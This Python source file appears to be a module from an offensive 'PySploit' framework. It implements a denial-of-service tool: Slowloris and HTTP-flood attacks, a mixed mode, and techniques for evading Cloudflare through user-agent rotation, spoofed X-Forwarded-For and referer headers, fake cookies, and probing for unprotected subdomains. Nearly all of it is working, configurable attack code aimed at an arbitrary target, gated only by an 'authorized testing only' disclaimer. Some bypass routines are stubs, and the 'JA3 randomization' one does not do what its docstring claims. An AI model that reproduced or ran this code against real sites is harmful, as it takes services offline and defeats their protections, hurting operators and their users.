#!/usr/bin/env python3
"""
Advanced DDoS Simulation & Cloudflare Bypass Testing
For authorized penetration testing and resilience assessment only
"""

import requests
import threading
import time
import random
import socket
import ssl
import urllib3
from concurrent.futures import ThreadPoolExecutor
from auxiliary.auxiliary_base import AuxiliaryBase

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DDoSAttackSimulator(AuxiliaryBase):
    def __init__(self):
        super().__init__()
        self.name = "auxiliary/dos/cloudflare_bypass"
        self.description = "Advanced DDoS Simulation & Cloudflare Bypass Testing"
        self.author = "PySploit Framework"
        
        self.options = {
            'TARGET': {'type': 'string', 'required': True, 'description': 'Target URL or IP address'},
            'ATTACK_TYPE': {'type': 'string', 'required': False, 'default': 'slowloris', 'description': 'Attack type: slowloris, http_flood, mixed, bypass_test'},
            'DURATION': {'type': 'int', 'required': False, 'default': 60, 'description': 'Attack duration in seconds'},
            'THREADS': {'type': 'int', 'required': False, 'default': 50, 'description': 'Number of concurrent threads'},
            'RATE_LIMIT': {'type': 'int', 'required': False, 'default': 10, 'description': 'Requests per second per thread'},
            'CLOUDFLARE_BYPASS': {'type': 'bool', 'required': False, 'default': True, 'description': 'Enable Cloudflare bypass techniques'},
            'USER_AGENTS_FILE': {'type': 'string', 'required': False, 'description': 'Path to custom user agents file'},
            'PROXY_LIST': {'type': 'string', 'required': False, 'description': 'Path to proxy list file'},
            'VERBOSE': {'type': 'bool', 'required': False, 'default': False, 'description': 'Show detailed output'}
        }
        
        self.stats = {
            'requests_sent': 0,
            'successful_responses': 0,
            'blocked_responses': 0,
            'errors': 0,
            'start_time': 0,
            'bypass_successful': False
        }
        
        self.common_user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]

    def run(self):
        target = self.get_option('TARGET')
        attack_type = self.get_option('ATTACK_TYPE')
        duration = self.get_option('DURATION')
        threads = self.get_option('THREADS')
        rate_limit = self.get_option('RATE_LIMIT')
        cloudflare_bypass = self.get_option('CLOUDFLARE_BYPASS')
        verbose = self.get_option('VERBOSE')
        
        # Validate target
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        print(f"[*] Starting Advanced DDoS Simulation & Cloudflare Bypass Test")
        print(f"[*] Target: {target}")
        print(f"[*] Attack Type: {attack_type}")
        print(f"[*] Duration: {duration} seconds")
        print(f"[*] Threads: {threads}")
        print(f"[*] Cloudflare Bypass: {cloudflare_bypass}")
        print(f"[*] WARNING: For authorized testing only!\n")
        
        # Initial reconnaissance
        if not self.target_reconnaissance(target, cloudflare_bypass):
            print("[-] Target reconnaissance failed")
            return False
        
        self.stats['start_time'] = time.time()
        
        try:
            if attack_type == 'slowloris':
                self.slowloris_attack(target, threads, duration, cloudflare_bypass, verbose)
            elif attack_type == 'http_flood':
                self.http_flood_attack(target, threads, duration, rate_limit, cloudflare_bypass, verbose)
            elif attack_type == 'mixed':
                self.mixed_attack(target, threads, duration, rate_limit, cloudflare_bypass, verbose)
            elif attack_type == 'bypass_test':
                self.cloudflare_bypass_test(target, threads, duration, verbose)
            else:
                print(f"[-] Unknown attack type: {attack_type}")
                return False
                
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        except Exception as e:
            print(f"[-] Attack error: {e}")
        
        self.show_results()
        return True

    def target_reconnaissance(self, target, cloudflare_bypass):
        """Perform initial target analysis"""
        print("[*] Performing target reconnaissance...")
        
        try:
            # Check if target is behind Cloudflare
            response = requests.get(target, timeout=10, verify=False)
            
            cloudflare_indicators = [
                'server' in response.headers and 'cloudflare' in response.headers['server'].lower(),
                'cf-ray' in response.headers,
                'cf-cache-status' in response.headers
            ]
            
            if any(cloudflare_indicators):
                print("[!] Target is behind Cloudflare protection")
                if cloudflare_bypass:
                    print("[*] Cloudflare bypass techniques will be attempted")
                else:
                    print("[!] Cloudflare bypass is disabled - attack may be blocked")
            else:
                print("[+] Target does not appear to be behind Cloudflare")
            
            # Get server information
            server = response.headers.get('server', 'Unknown')
            print(f"[+] Server: {server}")
            print(f"[+] HTTP Status: {response.status_code}")
            
            return True
            
        except Exception as e:
            print(f"[-] Reconnaissance failed: {e}")
            return False

    def slowloris_attack(self, target, threads, duration, cloudflare_bypass, verbose):
        """Slowloris attack - partial HTTP requests to exhaust connection pool"""
        print("[*] Starting Slowloris attack...")
        print("[*] Sending partial HTTP requests to exhaust server resources")
        
        def slowloris_worker(worker_id):
            end_time = time.time() + duration
            sockets = []
            
            try:
                while time.time() < end_time and len(sockets) < 100:  # Limit sockets per thread
                    try:
                        # Create raw socket connection
                        parsed_url = requests.utils.urlparse(target)
                        host = parsed_url.hostname
                        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        
                        if parsed_url.scheme == 'https':
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            sock = context.wrap_socket(sock, server_hostname=host)
                        
                        sock.connect((host, port))
                        
                        # Send partial HTTP request headers
                        partial_headers = self.generate_partial_headers(target, host)
                        sock.send(partial_headers.encode())
                        
                        sockets.append(sock)
                        self.stats['requests_sent'] += 1
                        
                        if verbose:
                            print(f"[Thread {worker_id}] Opened connection #{len(sockets)}")
                            
                    except Exception as e:
                        if verbose:
                            print(f"[Thread {worker_id}] Connection failed: {e}")
                        self.stats['errors'] += 1
                    
                    time.sleep(0.1)  # Small delay between connection attempts
                
                # Keep connections open for the duration
                time.sleep(duration)
                
            finally:
                # Close all sockets
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(slowloris_worker, i) for i in range(threads)]
            
            # Wait for completion or duration timeout
            for future in futures:
                try:
                    future.result(timeout=duration + 5)
                except:
                    pass

    def http_flood_attack(self, target, threads, duration, rate_limit, cloudflare_bypass, verbose):
        """HTTP flood attack - high volume of legitimate-looking requests"""
        print("[*] Starting HTTP Flood attack...")
        print("[*] Sending high volume of HTTP requests")
        
        def http_flood_worker(worker_id):
            end_time = time.time() + duration
            request_count = 0
            
            while time.time() < end_time:
                try:
                    headers = self.generate_legitimate_headers(target)
                    
                    # Rotate through different HTTP methods
                    methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
                    method = random.choice(methods)
                    
                    if method == 'POST':
                        response = requests.post(
                            target,
                            headers=headers,
                            data={'random_data': random.randint(1000, 9999)},
                            timeout=5,
                            verify=False
                        )
                    else:
                        response = requests.request(
                            method,
                            target,
                            headers=headers,
                            timeout=5,
                            verify=False
                        )
                    
                    self.stats['requests_sent'] += 1
                    request_count += 1
                    
                    if response.status_code == 200:
                        self.stats['successful_responses'] += 1
                    elif response.status_code in [403, 429, 503]:
                        self.stats['blocked_responses'] += 1
                        if verbose:
                            print(f"[Thread {worker_id}] Request blocked: HTTP {response.status_code}")
                    
                    if verbose and request_count % 10 == 0:
                        print(f"[Thread {worker_id}] Sent {request_count} requests")
                    
                    # Rate limiting
                    time.sleep(1.0 / rate_limit)
                    
                except Exception as e:
                    self.stats['errors'] += 1
                    if verbose:
                        print(f"[Thread {worker_id}] Request failed: {e}")
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(http_flood_worker, i) for i in range(threads)]
            
            for future in futures:
                try:
                    future.result(timeout=duration + 5)
                except:
                    pass

    def mixed_attack(self, target, threads, duration, rate_limit, cloudflare_bypass, verbose):
        """Mixed attack combining multiple techniques"""
        print("[*] Starting Mixed attack...")
        print("[*] Combining multiple attack vectors")
        
        # Use thread pools for different attack types
        slowloris_threads = max(1, threads // 3)
        flood_threads = threads - slowloris_threads
        
        print(f"[*] Slowloris threads: {slowloris_threads}")
        print(f"[*] HTTP Flood threads: {flood_threads}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Start Slowloris attack
            slowloris_futures = [
                executor.submit(self.slowloris_worker_simple, i, target, duration) 
                for i in range(slowloris_threads)
            ]
            
            # Start HTTP Flood attack
            flood_futures = [
                executor.submit(self.http_flood_worker_simple, i, target, duration, rate_limit)
                for i in range(flood_threads)
            ]
            
            # Wait for completion
            for future in slowloris_futures + flood_futures:
                try:
                    future.result(timeout=duration + 10)
                except:
                    pass

    def slowloris_worker_simple(self, worker_id, target, duration):
        """Simplified slowloris worker for mixed attacks"""
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                parsed_url = requests.utils.urlparse(target)
                host = parsed_url.hostname
                port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if parsed_url.scheme == 'https':
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                sock.connect((host, port))
                partial_headers = self.generate_partial_headers(target, host)
                sock.send(partial_headers.encode())
                
                self.stats['requests_sent'] += 1
                
                # Keep connection open for a while
                time.sleep(30)  # Keep open for 30 seconds
                sock.close()
                
            except Exception:
                self.stats['errors'] += 1
            finally:
                time.sleep(1)

    def http_flood_worker_simple(self, worker_id, target, duration, rate_limit):
        """Simplified HTTP flood worker for mixed attacks"""
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                headers = self.generate_legitimate_headers(target)
                response = requests.get(target, headers=headers, timeout=5, verify=False)
                self.stats['requests_sent'] += 1
                
                if response.status_code == 200:
                    self.stats['successful_responses'] += 1
                
                time.sleep(1.0 / rate_limit)
                
            except Exception:
                self.stats['errors'] += 1

    def cloudflare_bypass_test(self, target, threads, duration, verbose):
        """Test various Cloudflare bypass techniques"""
        print("[*] Starting Cloudflare Bypass Testing...")
        print("[*] Testing various bypass techniques")
        
        bypass_techniques = [
            self.bypass_user_agent_rotation,
            self.bypass_header_spoofing,
            self.bypass_referer_spoofing,
            self.bypass_cookie_manipulation,
            self.bypass_ip_rotation  # Would require proxy list
        ]
        
        successful_bypasses = 0
        
        for technique in bypass_techniques:
            print(f"[*] Testing technique: {technique.__name__}")
            if technique(target, verbose):
                successful_bypasses += 1
                print(f"[+] Bypass successful: {technique.__name__}")
            else:
                print(f"[-] Bypass failed: {technique.__name__}")
            time.sleep(2)  # Be polite
        
        self.stats['bypass_successful'] = successful_bypasses > 0
        print(f"[*] Cloudflare bypass testing completed: {successful_bypasses}/{len(bypass_techniques)} techniques successful")

    def generate_partial_headers(self, target, host):
        """Generate partial HTTP headers for Slowloris attack"""
        path = requests.utils.urlparse(target).path or '/'
        
        headers = [
            f"GET {path} HTTP/1.1\r\n",
            f"Host: {host}\r\n",
            "User-Agent: {}\r\n".format(random.choice(self.common_user_agents)),
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Connection: keep-alive\r\n",
            "Keep-Alive: timeout=900\r\n",
            # Intentionally don't send final \r\n to keep connection open
        ]
        
        return ''.join(headers)

    def generate_legitimate_headers(self, target):
        """Generate legitimate-looking HTTP headers to avoid detection"""
        user_agent = random.choice(self.common_user_agents)
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
        }
        
        # Add random headers to make requests look more legitimate
        extra_headers = {
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers'
        }
        
        headers.update(extra_headers)
        
        # Add referer occasionally
        if random.random() < 0.3:
            headers['Referer'] = self.generate_random_referer(target)
        
        return headers

    def generate_random_referer(self, target):
        """Generate random referer URLs"""
        domains = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://search.yahoo.com/',
            'https://duckduckgo.com/',
            'https://www.reddit.com/',
            'https://www.facebook.com/',
            'https://twitter.com/'
        ]
        
        return random.choice(domains)

    def bypass_user_agent_rotation(self, target, verbose):
        """Bypass technique: Rotate through legitimate user agents"""
        try:
            for ua in random.sample(self.common_user_agents, 3):
                headers = {'User-Agent': ua}
                response = requests.get(target, headers=headers, timeout=10, verify=False)
                
                if response.status_code == 200:
                    if verbose:
                        print(f"[+] User Agent bypass successful: {ua[:50]}...")
                    return True
                time.sleep(1)
        except:
            pass
        return False

    def bypass_header_spoofing(self, target, verbose):
        """Bypass technique: Spoof headers to look like different clients"""
        try:
            # Mobile headers
            mobile_headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-For': f'192.168.{random.randint(1,254)}.{random.randint(1,254)}'
            }
            
            response = requests.get(target, headers=mobile_headers, timeout=10, verify=False)
            if response.status_code == 200:
                if verbose:
                    print("[+] Header spoofing bypass successful (mobile)")
                return True
        except:
            pass
        return False

    def bypass_referer_spoofing(self, target, verbose):
        """Bypass technique: Use legitimate referers"""
        try:
            referers = [
                'https://www.google.com/search?q=test',
                'https://www.bing.com/search?q=test',
                'https://search.yahoo.com/search?p=test',
                'https://duckduckgo.com/?q=test'
            ]
            
            for referer in referers:
                headers = {'Referer': referer, 'User-Agent': random.choice(self.common_user_agents)}
                response = requests.get(target, headers=headers, timeout=10, verify=False)
                
                if response.status_code == 200:
                    if verbose:
                        print(f"[+] Referer spoofing bypass successful: {referer[:30]}...")
                    return True
                time.sleep(1)
        except:
            pass
        return False

    def bypass_cookie_manipulation(self, target, verbose):
        """Bypass technique: Cookie manipulation"""
        try:
            # Try with common cookie names
            cookies = {
                'sessionid': ''.join(random.choices('abcdef0123456789', k=32)),
                'csrftoken': ''.join(random.choices('abcdef0123456789', k=32)),
                'auth': '1',
                'visited': 'before'
            }
            
            response = requests.get(target, cookies=cookies, timeout=10, verify=False)
            if response.status_code == 200:
                if verbose:
                    print("[+] Cookie manipulation bypass successful")
                return True
        except:
            pass
        return False

    def bypass_ip_rotation(self, target, verbose):
        """Bypass technique: IP rotation (requires proxy list)"""
        # This would require a proxy list file
        # For demo purposes, we'll just return False
        if verbose:
            print("[*] IP rotation bypass requires PROXY_LIST option")
        return False

    def show_results(self):
        """Display attack results"""
        duration = time.time() - self.stats['start_time']
        
        print(f"\n[*] DDoS Simulation Complete")
        print("=" * 60)
        print(f"[*] Attack Duration: {duration:.2f} seconds")
        print(f"[*] Total Requests Sent: {self.stats['requests_sent']}")
        print(f"[*] Successful Responses: {self.stats['successful_responses']}")
        print(f"[*] Blocked Responses: {self.stats['blocked_responses']}")
        print(f"[*] Errors: {self.stats['errors']}")
        
        if duration > 0:
            rps = self.stats['requests_sent'] / duration
            print(f"[*] Average Requests/Second: {rps:.2f}")
        
        if self.stats['bypass_successful']:
            print(f"[+] Cloudflare bypass techniques were successful")
        else:
            print(f"[-] Cloudflare bypass techniques were not successful")
        
        print(f"\n[!] SECURITY NOTE: This module is for authorized testing only!")
        print(f"[!] Unauthorized use may violate laws and terms of service.")
    def advanced_cloudflare_bypass(self, target, verbose):
        """Advanced Cloudflare bypass techniques used in real attacks"""
        
        techniques = [
            self.bypass_ja3_randomization,      # TLS fingerprint randomization
            self.bypass_browser_emulation,      # Full browser behavior emulation
            self.bypass_websocket_protocol,     # WebSocket protocol attacks
            self.bypass_api_endpoints,          # Target API endpoints directly
            self.bypass_subdomain_discovery,    # Find unprotected subdomains
        ]
        
        return any(technique(target, verbose) for technique in techniques)

    def bypass_ja3_randomization(self, target, verbose):
        """Bypass JA3 TLS fingerprinting - used by advanced botnets"""
        try:
            # Implement TLS fingerprint randomization
            # This requires low-level socket manipulation
            context = ssl.create_default_context()
            context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
            
            response = requests.get(target, timeout=10, verify=False)
            if response.status_code == 200:
                if verbose:
                    print("[+] JA3 fingerprint randomization successful")
                return True
        except:
            pass
        return False

    def bypass_browser_emulation(self, target, verbose):
        """Emulate full browser behavior with JavaScript execution patterns"""
        try:
            # Add browser-like headers and behavior
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Simulate browser request patterns
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Follow links like a real browser would
                time.sleep(random.uniform(1, 3))
                response2 = requests.get(target + '/static/css/main.css', headers=headers, timeout=10, verify=False)
                
                if verbose:
                    print("[+] Browser emulation bypass successful")
                return True
        except:
            pass
        return False

    def bypass_websocket_protocol(self, target, verbose):
        """Bypass via WebSocket protocol - often less protected"""
        try:
            # Convert HTTP to WebSocket URL
            ws_url = target.replace('https://', 'wss://').replace('http://', 'ws://') + '/ws'
            
            # This would require websocket client implementation
            # Many WAFs have weaker WebSocket protection
            if verbose:
                print("[*] WebSocket bypass requires additional implementation")
            return False
        except:
            return False

    def bypass_api_endpoints(self, target, verbose):
        """Target API endpoints that might have weaker protection"""
        try:
            base_domain = target.split('//')[-1].split('/')[0]
            api_endpoints = [
                f"https://api.{base_domain}",
                f"https://mobile.{base_domain}",
                f"https://cdn.{base_domain}",
                target + '/api/v1/',
                target + '/graphql',
                target + '/rest/',
            ]
            
            for endpoint in api_endpoints:
                try:
                    response = requests.get(endpoint, timeout=5, verify=False)
                    if response.status_code == 200:
                        if verbose:
                            print(f"[+] API endpoint bypass: {endpoint}")
                        return True
                except:
                    continue
        except:
            pass
        return False

    def bypass_subdomain_discovery(self, target, verbose):
        """Find and target unprotected subdomains"""
        try:
            domain = target.split('//')[-1].split('/')[0]
            common_subdomains = [
                'dev', 'test', 'staging', 'mobile', 'api', 'cdn',
                'assets', 'static', 'media', 'img', 'js', 'css'
            ]
            
            for sub in common_subdomains:
                test_url = f"https://{sub}.{domain}"
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    if response.status_code == 200:
                        # Check if it's behind same protection
                        if 'cloudflare' not in response.headers.get('server', '').lower():
                            if verbose:
                                print(f"[+] Unprotected subdomain: {test_url}")
                            return True
                except:
                    continue
        except:
            pass
        return False